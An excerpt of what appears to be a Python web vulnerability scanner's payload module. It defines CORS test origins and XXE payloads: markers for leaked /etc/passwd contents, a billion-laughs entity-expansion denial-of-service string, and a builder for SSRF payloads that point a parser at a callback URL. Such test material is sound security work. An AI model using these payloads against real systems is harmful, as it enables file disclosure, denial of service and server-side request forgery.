...
class CORSPayloads:
    """
    Origin values used to probe for CORS misconfigurations
    """
    ...
    @classmethod
    def get_test_origins(cls) -> list[str]:
        """
        Get the list of origins to test for CORS reflection

        Returns:
            list[str]: Origins to send in the Origin header
        """
        return list(cls.TEST_ORIGINS)


class XXEPayloads:
    """
    XML External Entity payloads for file disclosure and SSRF testing
    """

    # Markers that indicate /etc/passwd contents leaked into the response
    FILE_DISCLOSURE_MARKERS = ["root:x:0:0", "root:", "/bin/bash", "daemon:"]
    ...
    # Billion-laughs style entity expansion (denial of service)
    BILLION_LAUGHS = (
        '<?xml version="1.0"?>\n'
        "<!DOCTYPE lolz [\n"
        '  <!ENTITY lol "lol">\n'
    ...
    @classmethod
    def ssrf_payload(cls, callback_url: str) -> str:
        """
        Build an XXE payload that dereferences an external URL (SSRF)

        Args:
            callback_url: URL the parser is coaxed into requesting

        Returns:
            str: XML payload with an external SYSTEM entity
        """
        return (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            "<!DOCTYPE foo [\n"
